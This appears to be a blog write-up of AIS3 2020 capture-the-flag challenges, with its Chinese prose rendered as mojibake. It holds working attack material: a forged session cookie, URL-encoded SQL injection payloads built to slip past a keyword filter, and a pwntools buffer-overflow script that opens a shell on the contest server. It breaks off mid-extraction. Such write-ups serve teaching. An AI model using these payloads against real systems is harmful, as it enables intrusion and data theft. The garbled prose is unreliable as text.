æˆ‘å€‘æ™šé»å†è™•ç† `cookie-session` å› ç‚ºé‚£å€‹å¥½è™•ç†ï¼Œåœ¨åœ°æ–¹ç«¯åŸ·è¡Œä¸€æ¬¡å°±å¥½ã€‚æˆ‘å€‘å…ˆçœ‹åˆ°åº•è¦æ€æ¨£æ‰èƒ½è®“ `req.session.magic` è®Šæˆä¸€å€‹ç¬¦åˆæœŸæœ›çš„å€¼ã€‚æˆ‘ä¸€é–‹å§‹çš„æƒ³æ³•æ˜¯è©¦è©¦çœ‹èƒ½ä¸èƒ½æŠŠ `magic` æŒ‡æ´¾ç‚ºä¸€å€‹ JavaScript objectç„¶å¾Œoverride `ToString`/`toPrimitive`ã€‚å¾ˆå¯æƒœçš„ï¼Œä¸ç®¡æ€éº¼æ”¹ï¼Œå›å‚³çš„ Cookie æ°¸é ä¸æœƒæŠŠ JS Object ä¸Ÿå›ä¾†ã€‚

![](/assets/images/posts/ais3-2020-writeup/CRNHLxU.png)

é€™é¡Œæˆ‘æƒ³äº†å¾ˆä¹…ï¼Œæˆ‘é–‹å§‹æƒ³èªªæœƒä¸æœƒæ˜¯åœ¨è€ƒ JS çš„å…¶ä»–å‹æ…‹ï¼Œè€Œè·Ÿ JS Object æ²’ä»€éº¼é—œä¿‚ï¼Ÿæ‰€ä»¥æˆ‘é–‹å§‹ä¸Ÿäº†å„ç¨®å‹æ…‹é€² Node CLI è©¦è©¦çœ‹åˆ°åº•ä»€éº¼å‹æ…‹ä¸‹æœƒæˆç«‹ã€‚ç„¶å¾Œæˆ‘å°±å¾ˆé»‘ç®±çš„æ–¹å¼ä¸å°å¿ƒçŒœåˆ°äº†(?)ã€‚

![](/assets/images/posts/ais3-2020-writeup/5vsA3MB.png)

{% capture js-note %}
å»¶ä¼¸é–±è®€ï¼š
- [JavaScript Numbers (w3schools)](https://www.w3schools.com/js/js_numbers.asp)
- [Number - JavaScript (MDN)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number)
{% endcapture %}

<div class="notice--info">
  {{ js-note | markdownify }}
</div>

åŸä¾†å•é¡Œæ˜¯åœ¨ JavaScript å…¶å¯¦ä¸¦æ²’æœ‰æ‰€è¬‚ `double`/`decimal`/`int`/`float` é€™äº›æ•¸å­—å‹æ…‹çš„å·®åˆ¥ï¼Œå…¨éƒ¨éƒ½æ˜¯ `Number`ã€‚é€éå»¶ä¼¸é–±è®€ï¼Œæˆ‘å€‘ç™¼ç¾ JavaScript å…¶å¯¦è·Ÿæˆ‘ä¸€æ¨£ï¼Œæ•¸å­¸å¾ˆå·®ã€‚

> The maximum number of decimals is 17, but floating point arithmetic is not always 100% accurate

æ•¸å­—ä¸€æ—¦å¤ªå¤šå°æ•¸é»å°±æœƒé–‹å§‹ä¸æº–ï¼Œé€™æ™‚å†é€²è¡ŒåŠ æ¸›å°±å¾ˆå®¹æ˜“å‡ºç¾ä¸€äº›æˆ‘å€‘èªç‚ºä¸è©²å‡ºç¾çš„æ±è¥¿ã€‚

```javascript
var x = 0.2 + 0.1;         // x will be 0.30000000000000004
```

æ‰€ä»¥åœ¨çŸ¥é“é€™ä¸€åˆ‡ä¹‹å¾Œæˆ‘å€‘å°±å¯ä»¥å¾åœ°æ–¹ç«¯æŠŠ `req.session.magic` æ”¹æˆ `Number.MIN_VALUE` ç„¶å¾Œä¸Ÿå‡ºå»æ‹¿æˆ‘å€‘çš„ Cookieã€‚

![](/assets/images/posts/ais3-2020-writeup/v5en4m4.png)

æ‰€ä»¥æˆ‘å€‘æ‰€éœ€è¦æ‹¿ flag çš„ Cookie å°±æ˜¯:

```plaintext
Set-Cookie: express:sess=eyJtYWdpYyI6NWUtMzI0fQ==; path=/; httponly
Set-Cookie: express:sess.sig=PcDKAJv_XBACTW9q-OASaZSdEIQ; path=/; httponly
```

```shell
â¯ curl https://rhino.ais3.org/flag.txt -H "Cookie: express:sess=eyJtYWdpYyI6NWUtMzI0fQ==;" -H "Cookie: express:sess.sig=PcDKAJv_XBACTW9q-OASaZSdEIQ;"
AIS3{h4v3_y0u_r34d_7h3_rh1n0_b00k?}
```

Flag:
`AIS3{h4v3_y0u_r34d_7h3_rh1n0_b00k?}`

### ğŸ¦‰ Owl (492 pt.)

> Flag is inside the database.
> - There's a hint in the webpage
> - This is a hybridge challenge with Turtle in Crypto

ä¸€é–‹å§‹çœ‹åˆ° Crypto æˆ‘çš„åæ‡‰: (ã£ Â°Ğ” Â°;)ã£
ç•¢ç«Ÿæˆ‘å°å¯†ç¢¼å­¸çš„æ±è¥¿æ„Ÿåˆ°éå¸¸ææ…Œï¼Œæ•¸å­¸ç›¸é—œçš„æ±è¥¿éƒ½çˆ›çˆ†ï¼Œä½†å¾Œä¾†ä»”ç´°çœ‹å…¶å¯¦ç™¼ç¾å¥½åƒæ²’æœ‰å¤ªå¤§é—œä¿‚ã€‚ç¬¬ä¸€ä»¶äº‹å°±æ˜¯é–‹Fiddlerçœ‹ä¸­é–“çš„è«‹æ±‚è·Ÿå›æ‡‰ã€‚

```
#	Result	Protocol	Host	URL	Body	Caching	Content-Type	Process	Comments	Custom	
16	200	HTTPS	turtowl.ais3.org	/?action=login	86	no-store, no-cache, must-revalidate; Expires: Thu, 19 Nov 1981 08:52:00 GMT	text/html; charset=UTF-8	msedge:10224			
21	200	HTTPS	turtowl.ais3.org	/	716	no-store, no-cache, must-revalidate; Expires: Thu, 19 Nov 1981 08:52:00 GMT	text/html; charset=UTF-8	msedge:10224
```

![](/assets/images/posts/ais3-2020-writeup/JehCCWQ.png)

æˆ‘å€‘ç™¼ç¾å®ƒæœƒæŠŠæˆ‘å€‘å°å‘è‡³ `https://turtowl.ais3.org/?action=login` ä¸¦å°‡æˆ‘å€‘çš„ç™»å…¥è³‡è¨Š POST éå»ï¼Œå¦‚æœè³‡æ–™ä¸å°çš„è©±æœƒå™´éŒ¯ç„¶å¾ŒæŠŠæˆ‘å€‘ä¸Ÿå›åˆ°ç™»å…¥é é¢ã€‚æç¤ºæåˆ° `GUESS THE STUPID USERNAME / PASSWORD`ï¼Œæ‰€ä»¥å¤§æ¦‚æ˜¯å¼±å¯†ç¢¼...? AIS3 æ‡‰è©²ä¸å¤ªå¯èƒ½å‡ºé‚£éº¼OOçš„é¡Œç›®ï¼Œæ‰€ä»¥æ‡‰è©²é‚„æœ‰ã€‚æˆ‘å€‘é€é `admin/admin` ç™»å…¥é€²ä¾†ä¹‹å¾Œçœ‹åˆ°ä»¥ä¸‹ï¼š

```html
<head>
    <title>ğŸ¦‰ğŸ¦‰ğŸ¦‰ğŸ¦‰</title>
    <meta charset='utf-8'>
    <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
</head>
<body>
            <h3 class="text-center text-white pt-5"><a style="color: white" href="/?source">SHOW HINT</a></h3>
        <div class="container">
            <div class="row justify-content-center align-items-center">
                <div class="col-md-6">
                    <div class="col-md-12">
                        <h3 class="text-center text-info">Nothing</h3>
                        Hello, <b>admin</b>, nothing here.
                        <a href="?action=logout">Logout!</a>
                    </div>
                </div>
            </div>
        </div>
    </body>
```

è£¡é¢çš„æç¤ºæåˆ°äº† `https://turtowl.ais3.org/?source`ï¼Œä¼°è¨ˆæ˜¯ `index.php` çš„åŸå§‹ç¢¼ã€‚

æˆ‘å€‘å¯ä»¥çœ‹åˆ°å¾ˆæœ‰è¶£çš„å¹¾é»ï¼š
- CSRF æ˜¯ç”± MD5 éš¨æ©Ÿæ•¸\*éš¨æ©Ÿæ•¸ç•¶ä½œ Key ç”¢ç”Ÿçš„
- sqlmap è¢«æ“‹æ‰äº†
    - å¤§æ¦‚æ˜¯è¦ºå¾— sqlmap å°å­©å¤ªå¤šäº†
- `$username` æœ‰ç‰¹åˆ¥é€²è¡Œå…©æ¬¡ `str_ireplace` æŠŠå±éšªå­—ä¸²ç§»æ‰
    - å…©æ¬¡ï¼Ÿ
- ç›´æ¥åŸ·è¡Œä¸‹åˆ— SQL Statement
    - `SELECT * FROM users WHERE username = '$username' AND password = '$hash'`

å¾ˆæ˜é¡¯çš„ï¼Œä¸»è¾¦å¸Œæœ›æˆ‘å€‘æ”»æ“Šçš„é»æ˜¯ç”¨æˆ¶åï¼Œå¯æ˜¯æˆ‘å€‘å¾—å…ˆè€ƒæ…®å…ˆå‰çš„ `str_ireplace`ã€‚æˆ‘å€‘è©²æ€éº¼ç¹å‘¢ï¼Ÿ

![](/assets/images/posts/ais3-2020-writeup/5QL26kj.png)


æˆ‘å€‘çŸ¥é“ä»–æœƒé€²è¡Œå…©æ¬¡æ›¿æ›ï¼Œé‚£æˆ‘å€‘åœ¨æˆ‘å€‘å­—ä¸²è£¡é¢æ··ä¸€äº›å®ƒæœƒæ›¿æ›çš„å­—å°±å¥½äº†å‘€ï¼š

![](/assets/images/posts/ais3-2020-writeup/X6vvgaF.png)


é‚£ç©ºæ ¼æ€éº¼è¾¦ï¼Ÿç©ºæ ¼ä¹Ÿæœƒæ›æ‰é˜¿ï¼Ÿé€™æ™‚æˆ‘å€‘å¯ä»¥ç”¨æ›è¡Œç¬¦è™Ÿæˆ–Tab characteræ›¿ä»£ã€‚æ‰€ä»¥æˆ‘å€‘æœ€å¾Œçš„ POST è³‡æ–™æ‡‰è©²æ˜¯ï¼š

`username=%27%0Ao-selandect-r%0A1%3D1%3B%2Foselandectr*&password=asdf&csrf_token=$csrfToken`

é€™æ¨£æˆ‘å€‘å°±æˆåŠŸä»¥ root ç™»å…¥äº†ï¼æ¥è‘—å°±æ˜¯é–‹å§‹æŒ–è³‡æ–™ï¼Œæˆ‘å€‘é€é PHP åŸå§‹ç¢¼çŸ¥é“ Database ç¨®é¡æ˜¯ SQLite3ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥é–‹å§‹å¯«æˆ‘å€‘çš„SQL Statementã€‚æˆ‘å€‘å¾ä¸­æ’ˆåˆ°æœ‰å€‹tableå« `garbage`ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥é–‹å§‹çœ‹çœ‹è£¡é¢æœ‰ä»€éº¼ã€‚

Column names in table `garbage`:
```sql
-- result: id,name,value,
-- encoded payload: '%0Aunioorron%0Aall%0Aselselandectect%0A256%0Aas%0Aid,%0Agroup_concat(name)%0Aas%0Ausername,%0A''%0Aas%0Apasswooorrrd%0Afrfrfromomom%0Apragma_table_info('garbage');/oselandectr*
' union all select 256 as id, group_concat(name) as username, '' as password from pragma_table_info('garbage');/or*
```

Values in column `value` in table `garbage`:
```sql
-- result: sqlmap is for child,who starts selling weeds,this is the flag: AIS3{4_ch1ld_15_4_curly_d1mpl3d_lun471c},Im watching you,
-- encoded payload: '%0Aunioorron%0Aall%0Aselselandectect%0A256%0Aas%0Aid,%0Agroup_concat(value)%0Aas%0Ausername,%0A''%0Aas%0Apasswooorrrd%0Afrfrfromomom%0Agarbage;/oselandectr*

' union all select 256 as id, group_concat(value) as username, '' as password from garbage;/or*
```

Flag:
`AIS3{4_ch1ld_15_4_curly_d1mpl3d_lun471c}`

## Crypto

### ğŸ¦• Brontosaurus (100 pt.)

> Brontosaurus peek at last yearâ€™s problems with a long neck and picked up "KcufsJ".

çœ‹åˆ° `KcufsJ` å·²ç¶“è…¦è¢‹ç›´æ¥æƒ³åˆ° JsFuck äº†ã€‚ JsFuck æ˜¯ä»€éº¼å‘¢ï¼Ÿ JsFuck åŸºæœ¬ä¸Šæ˜¯ç”± Brainfuck é€™å€‹èªè¨€éä¾†çš„ï¼Œæ‰€ä»¥èªè¨€éå¸¸ç›¸ä¼¼ã€‚æˆ‘å€‘å¯ä»¥ç›´æ¥æŠŠå®ƒä¸Ÿåˆ°[å…¶ä»–äººå·²ç¶“å¯«å¥½çš„ Interpreter å¯¦ä½œ](https://enkhee-osiris.github.io/Decoder-JSFuck/)ã€‚

æ¬¸ï¼Ÿ

![](/assets/images/posts/ais3-2020-writeup/SePFxuz.png)

ç‚ºä»€éº¼å™´éŒ¯ï¼Ÿä»”ç´°çœ‹äº†ä¸€ä¸‹ï¼ŒåŸä¾†æ˜¯ä¸»è¾¦å¾ˆè²¼å¿ƒåœ°å¹«æˆ‘å€‘æŠŠé€™å€‹å­—ä¸²é€²è¡Œ reverse äº†ï¼é€™æ™‚å€™æˆ‘å€‘æŠŠé€†å›ä¾†å†åŸ·è¡Œä¸€æ¬¡çœ‹çœ‹ã€‚

![](/assets/images/posts/ais3-2020-writeup/mVd6oC2.png)

Flag:
`AIS3{Br0n7Os4uru5_ch3at_3asi1Y}`

### ğŸ¦– T-Rex (100 pt.)

> Tyrannosaurus-rex is an nihilist.

ç°½åˆ°é¡Œï¼Œç…§è¡¨æ ¼é€²è¡Œå­—ä¸²æ›¿æ›å³å¯ã€‚

```plaintext
        !       @       #       $       %       &

!       V       F       Y       J       6       1

@       5       0       M       2       9       L

#       I       W       H       S       4       Q

$       K       G       B       X       T       A

%       E       3       C       7       P       N

&       U       Z       8       R       D       O
```

```powershell
'&$ !# $# @% { %$ #! $& %# &% &% @@ $# %# !& $& !& !@ _ $& @% $$ _ @$ !# !! @% _ #! @@ !& _ $# && #@ !% %$ ## !# &% @$ _ $& &$ &% %& && #@ _ !@ %$ %& %! $$ &# !# !! &% @% ## $% !% !& @! #& && %& !% %$ %# %$ @% ## %@ @@ $% ## !& #% %! %@ &@ %! &@ %$ $# ## %# !$ &% @% !% !& $& &% %# %@ #$ !# && !& #! %! ## #$ @! #% !! $! $& @& %% @@ && #& @% @! @# #@ @@ @& !@ %@ !# !# $# $! !@ &$ $@ !! @! &# @$ &! &# $! @@ &@ !% #% #! &@ &$ @@ &$ &! !& #! !# ## %$ !# !# %$ &! !# @# ## @@ $! $$ %# %$ @% @& $! &! !$ $# #$ $& #@ %@ @$ !% %& %! @% #% $! !! #$ &# ## &# && $& !! !% $! @& !% &@ !& $! @# !@ !& @$ $% #& #$ %@ %% %% &! $# !# $& #@ &! !# @! !@ @@ @@ ## !@ $@ !& $# %& %% !# !! $& !$ $% !! @$ @& !& &@ #$ && @% $& $& !% &! && &@ &% @$ &% &$ &@ $$ }'.Replace('!!','V').Replace('!@','5').Replace('!#','I').Replace('!$','K').Replace('!%','E').Replace('!&','U').Replace('@!','F').Replace('@@','0').Replace('@#','W').Replace('@$','G').Replace('@%','3').Replace('@&','Z').Replace('#!','Y').Replace('#@','M').Replace('##','H').Replace('#$','B').Replace('#%','C').Replace('#&','8').Replace('$!','J').Replace('$@','2').Replace('$#','S').Replace('$$','X').Replace('$%','7').Replace('$&','R').Replace('%!','6').Replace('%@','9').Replace('%#','4').Replace('%$','T').Replace('%%','P').Replace('%&','D').Replace('&!','1').Replace('&@','L').Replace('&#','Q').Replace('&$','A').Replace('&%','N').Replace('&&','O').Replace(' ','')
```

Flag:

```plaintext
AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}
```

## Pwn

å¾ˆå¯æƒœï¼Œéäº†ä¸€å¹´æˆ‘ Pwn é‚„æ˜¯åªæœƒç°½åˆ°é¡Œï¼Œæ‰€ä»¥åªèƒ½è§£å‡º BOFã€‚

### ğŸ‘» BOF (100 pt.)

å»å¹´æˆ‘æ˜¯ä¾æ™®é€šèµ·æ‰‹å¼ `objdump` æ‰¾åˆ° `system('sh')` çš„ä½å€ä¾†å¯«çš„ã€‚ä»Šå¹´æˆ‘çš„æƒ³æ³•æ˜¯è©¦è©¦çœ‹é€é radare2 ä¾†æ‰¾ä½å€ã€‚å› æ­¤é¦–å…ˆç¬¬ä¸€ä»¶äº‹å°±æ˜¯ `aa` ç„¶å¾Œ `pdf` çœ‹æ‰€æœ‰ function çš„ä½å€ã€‚

![](/assets/images/posts/ais3-2020-writeup/STZEATh.jpg)

å¯æ˜¯ä¸è«–æ€éº¼ç¿»éƒ½æ‰¾ä¸åˆ° system callï¼Œé›–ç„¶ `0x00400570` çš„éƒ¨åˆ†æœ‰æåˆ° `system`ï¼Œä½†å¾ˆæ˜é¡¯åªæ˜¯ reference system call è€Œå·²ï¼Œæ‰€ä»¥æˆ‘æœ€å¾Œé‚„æ˜¯ä¹–ä¹–çš„ç”¨ Ghidra ä¾†æ‰¾æ‰¾ `system` é€™æ±è¥¿æ˜¯è¢«å“ªå€‹ function ä½å€ç”¨çš„ã€‚

![](/assets/images/posts/ais3-2020-writeup/owIoO53.png)

æˆ‘å€‘ç™¼ç¾ `0x00400687` çš„åœ°æ–¹æœ‰å‘¼å« `CALL system` çš„ functionï¼Œç„¶å¾Œ `main` åº•ä¸‹çš„ `gets` æ‰€ allocate çš„è¨˜æ†¶é«”æ˜¯ 0x30ã€‚

![](/assets/images/posts/ais3-2020-writeup/G8pqQRL.png)

æ‰€ä»¥æˆ‘å€‘å°±å¯ä»¥é–‹å§‹å¯« pwntools çš„ Python è…³æœ¬å•¦ï¼

```python
import pwn
pwn.context.update(arch='amd64', os='linux')
remote_address = '60.250.197.227'
remote_port = 10000
if not remote_address:
    process = pwn.process('./bof-767fdf896cf9838c0294db24eaa1271ebf15a6e638a873e94ab9682ef28464b4')
else:
    process = pwn.remote(remote_address, remote_port)
payload = b'a'*0x30 + pwn.pack(0x00400687)
print(process.recvline())
process.sendline(payload)
try:
    process.sendline('whoami')
    process.interactive()
except EOFError:
    print("Failed to pwn the remote machine.")
```

![](/assets/images/posts/ais3-2020-writeup/2lIGWqi.jpg)

Flag:

```plaintext
AIS3{OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt}
```

## Reverse

### ğŸ TsaiBro (100 pt.)

![](https://cdn.discordapp.com/attachments/440255677701685283/718451798981214288/ezgif-6-434c4d3244b1.gif)

çœ‹èµ·ä¾†ä¹Ÿæ˜¯å»å¹´é¡Œç›®ã€‚åŸ·è¡Œæ™‚ï¼Œç¨‹å¼æœƒè¦æ±‚è¦é…ä¸Šä¸€å€‹ stringï¼Œç„¶å¾Œæœƒå™´å‡ºé€™æ±è¥¿éœ€è¦ä»€éº¼å­—ä¸²ä¾†å°æ‡‰ä½ è¼¸å…¥çš„æ±è¥¿ã€‚

```shell
â¯ ./TsaiBro
./TsaiBro string%

â¯ ./TsaiBro a
Terry...é€†é€†...æ²’æœ‰...å­¸å•...å–®ç´”...åˆ†äº«...å€‹äºº...ç”Ÿæ´»...æ„Ÿè§¸...
ç™¼è²¡...ç™¼è²¡.% 
```

è€Œæ ¹æ“š `TsaiBroSaid` è£¡é¢çš„å­—ä¸²ï¼Œæˆ‘å€‘å¿…é ˆå¾—é€éä¸Šé¢çš„æ–¹æ³•é‡çµ„å‡ºæˆ‘å€‘çš„ Flagã€‚é€™æ™‚å€™æˆ‘å€‘å°±å¯ä»¥ç”¨å¾ˆæš´åŠ›çš„æ–¹å¼ç”¨ pwntools å¹«æˆ‘å€‘æˆ³æ¯å€‹ printable ASCII çš„å°æ‡‰å­—ä¸²ã€‚ä¸éå› ç‚ºæ¯çµ„å­—ä¸²éƒ½æ˜¯å…©å€‹`ç™¼è²¡`çµ„åœ¨ä¸€èµ·çš„ï¼Œæ‰€ä»¥æˆ‘ç”¨ RegEx æŠŠå®ƒå€‘ä¸€çµ„ä¸€çµ„æ‹†é–‹ã€‚

```python
import pwn
import string
import re
flag = "ç™¼è²¡..ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡.ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡......ç™¼è²¡..ç™¼è²¡.....ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡......ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡..ç™¼è²¡.....ç™¼è²¡..ç™¼è²¡....ç™¼è²¡.....ç™¼è²¡.....ç™¼è²¡.ç™¼è²¡........ç™¼è²¡......ç™¼è²¡....ç™¼è²¡........ç™¼è²¡........ç™¼è²¡.....ç™¼è²¡......ç™¼è²¡......ç™¼è²¡.ç™¼è²¡.ç™¼è²¡........ç™¼è²¡......ç™¼è²¡.......ç™¼è²¡........ç™¼è²¡........ç™¼è²¡.....ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡.ç™¼è²¡...ç™¼è²¡......ç™¼è²¡....ç™¼è²¡........ç™¼è²¡.....ç™¼è²¡......ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡...ç™¼è²¡...ç™¼è²¡......ç™¼è²¡....ç™¼è²¡........ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡......ç™¼è²¡......ç™¼è²¡...ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡...ç™¼è²¡..ç™¼è²¡......ç™¼è²¡.ç™¼è²¡......ç™¼è²¡..ç™¼è²¡..ç™¼è²¡....ç™¼è²¡......ç™¼è²¡......ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡...ç™¼è²¡..ç™¼è²¡.....ç™¼è²¡.....ç™¼è²¡.ç™¼è²¡...ç™¼è²¡.ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡......ç™¼è²¡........ç™¼è²¡......ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡...ç™¼è²¡.....ç™¼è²¡..ç™¼è²¡....ç™¼è²¡......ç™¼è²¡......ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡....ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡.......ç™¼è²¡...ç™¼è²¡......ç™¼è²¡......ç™¼è²¡...ç™¼è²¡.ç™¼è²¡........ç™¼è²¡.ç™¼è²¡...ç™¼è²¡......ç™¼è²¡....ç™¼è²¡........ç™¼è²¡.....ç™¼è²¡......ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡........ç™¼è²¡......ç™¼è²¡........ç™¼è²¡........ç™¼è²¡.....ç™¼è²¡...ç™¼è²¡.....ç™¼è²¡........ç™¼è²¡.......ç™¼è²¡.ç™¼è²¡......."

flag_segments = re.findall("ç™¼è²¡\.{1,99}ç™¼è²¡\.{1,99}", flag)

for c in string.printable:
    process = pwn.process(["./TsaiBro", c])
    process.recvline()
    try:
        secret_chr = process.recv().decode()
        print(secret_chr)
        for i in range(0,len(flag_segments)):
            if flag_segments[i] == secret_chr:
                flag_segments[i] = c
    except EOFError:
        pass

print(''.join(flag_segments))
```

Flag:

```plaintext
AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}
```

### ğŸ¹ Fallen Beat (144 pt.)

é€™é¡Œæˆ‘çœ‹åˆ°æ˜¯ Java æª”å°±çŸ¥é“æ˜¯è¦ Decompile å› Java ç„¶å¾Œå†ç¿»çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€ä»¶äº‹ç•¶ç„¶å°±æ˜¯ `jd` ä¸€ä¸‹å›‰ã€‚

```shell
18:08:22.060 INFO  com.github.kwart.jd.cli.Main - Decompiling .\Fallen_Beat.jar
18:08:22.065 INFO  com.github.kwart.jd.output.ZipOutput - ZIP file output will be initialized - Fallen_Beat.src.jar
18:08:22.527 INFO  com.github.kwart.jd.output.ZipOutput - Finished with 15 class file(s) and 1 resource file(s) written.
```

æ¥è‘—å°±æ˜¯æŠŠ IDEA ç¿»å‡ºä¾†ç„¶å¾Œæ…¢æ…¢çœ‹æª”æ¡ˆã€‚ä¸€é–‹å§‹çœ‹åˆ°çš„ Code å…¶å¯¦é‚„æ»¿äº‚çš„ï¼Œä¸éæˆ‘å€‘å¯ä»¥æƒ³æƒ³éŠæˆ²æ§åˆ¶çš„æ±è¥¿å¤§æ¦‚éƒ½æœƒå¡åœ¨å“ªã€‚

è§£é¡Œæ–¹å‘ï¼š

- æç¤ºè·Ÿæˆ‘å€‘èªªè¦æŠŠæ‰€æœ‰ Combo æŒ‰å‡ºä¾†ï¼Œé‚£éŠæˆ²æ€éº¼å–å¾—æœ€é«˜ Combo æ˜¯å¤šå°‘ï¼Ÿ
    - æ–¹æ³•ä¸€: æŠŠ Max Combo æ›æˆå®¹è¨±çš„æœ€é«˜å€¼
- åœ¨ `PanelEnding` è£¡é¢ï¼Œæˆ‘å€‘æœ‰æ‰¾åˆ°å– Flag çš„ä¸€æ®µ
    - æˆ‘å€‘å¦‚æœçŸ¥é“ Cache æ˜¯ä»€éº¼çš„è©±å°±å¯ä»¥ç›´æ¥æŠŠ Flag å¾ byte\[\] å™´å‡ºä¾†
    - æˆ‘å€‘æ—¢ç„¶æœ‰ Debugger è·Ÿ Code äº†ï¼Œé‚£æˆ‘å€‘ç›´æ¥è®“é‚£å€‹ `if` å™´ `true` å°±å¥½å•¦
    - æ–¹æ³•äºŒï¼šç›´æ¥è·³é `if (t == mc)`

```java
if (t == mc) {
  for (i = 0; i < cache.size(); i++)
    this.flag[i % this.flag.length] = (byte)(this.flag[i % this.flag.length] ^ ((Integer)cache.get(i)).intValue()); 
  String fff = new String(this.flag);
  this.text[0].setText(String.format("Flag: %s", new Object[] { fff }));
}
```

éŸ³æ¨‚éƒ¨åˆ†

- æ¯æ¬¡éƒ½å¾—ç­‰éŸ³æ¨‚è·‘å®Œï¼Œé‚£æˆ‘å€‘æŠŠç­‰éŸ³æ¨‚é‚£å¹¾è¡Œå»æ‰å°±ä¸ç”¨ç­‰å•¦
  - ![](/assets/images/posts/ais3-2020-writeup/5QV9hFp.png)

éŠæˆ²ä¸€é–‹å§‹é¦¬ä¸Šå°±èƒ½å™´ Flag äº†ã€‚

![](/assets/images/posts/ais3-2020-writeup/FZTp8ZV.png)

### ğŸŒ¹ La vie en rose (499 pt.)

é€™æ˜¯æˆ‘é€™æ¬¡ AIS3 èŠ±æœ€ä¹…çš„ä¸€é¡Œï¼Œä¹Ÿæ˜¯æˆ‘è¦ºå¾—æœ€å˜”çš„ä¸€é¡Œï¼Œå› ç‚ºæˆ‘æ‘¸å‡ºä¾†ä¹‹å¾Œçœ‹ä¸å‡ºæ€éº¼è§£å¥½ä¸€æ®µæ™‚é–“ï¼Œè€Œä¸”æ˜¯ç”¨æœ€æš´åŠ›çš„æ–¹å¼è§£ã€‚

é¦–å…ˆï¼Œæˆ‘å€‘ä¸€çœ‹å°±çŸ¥é“æœ¬é¡Œæ‰€é™„çš„ exe æª”æ˜¯æŸç¨® Python ç·¨è­¯è€Œæˆçš„æª”æ¡ˆã€‚æ€éº¼çœ‹å¾—ï¼Ÿæˆ‘å€‘é¦–å…ˆå¯ä»¥çœ‹å®ƒçš„ iconï¼Œå¾ˆæ˜é¡¯å°±æ˜¯ Python çš„ Logo è¡ç”Ÿå‡ºä¾†çš„ã€‚

![](/assets/images/posts/ais3-2020-writeup/ZJ2Proq.png)

å¦‚æœé€™æ¨£é‚„ä¸å¤ çš„è©±ï¼Œæˆ‘å€‘å¯ä»¥å¾é€™æ±è¥¿åŸ·è¡Œæ™‚çš„ memory references ä¾†çœ‹é€™æ±è¥¿ç›®å‰æœ‰é–‹å“ªäº› handlesã€‚åœ¨é€™äº› handles è£¡é¢ï¼Œå±¢æ¬¡æåˆ° `python38.dll`ï¼Œæ‰€ä»¥å¾ˆæ˜é¡¯æœ‰ç”¨åˆ° Python 3.8 çš„ runtimeã€‚

![](/assets/images/posts/ais3-2020-writeup/2ef1IqO.png)

é‚£æˆ‘å€‘åœ¨çŸ¥é“é€™é»å¾Œå°±å¯ä»¥é–‹å§‹æ‰¾æ‰¾è§£åŒ…çš„è…³æœ¬/ç¨‹å¼ï¼Œè€Œæœ‰å¯« Python è…³æœ¬æœ‰æƒ³éæ‰“åŒ…çš„äººéƒ½çŸ¥é“ PyInstaller å¯ä»¥åšåˆ°é€™å›äº‹ï¼Œæ‰€ä»¥æ‰¾ä¸€ä¸‹ç›¸é—œé—œéµå­—å°±å¯ä»¥æ‰¾åˆ°åæ‰“åŒ…çš„æ±è¥¿ã€‚æˆ‘å€‹äººæ˜¯ä½¿ç”¨ [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor/) å°‡ç›¸é—œæª”æ¡ˆæ‹‰å‡ºä¾†ã€‚

```shell
â¯ py -3 .\pyinstxtractor.py La_vie_en_rose.exe
[+] Processing La_vie_en_rose.exe
[+] Pyinstaller version: 2.1+
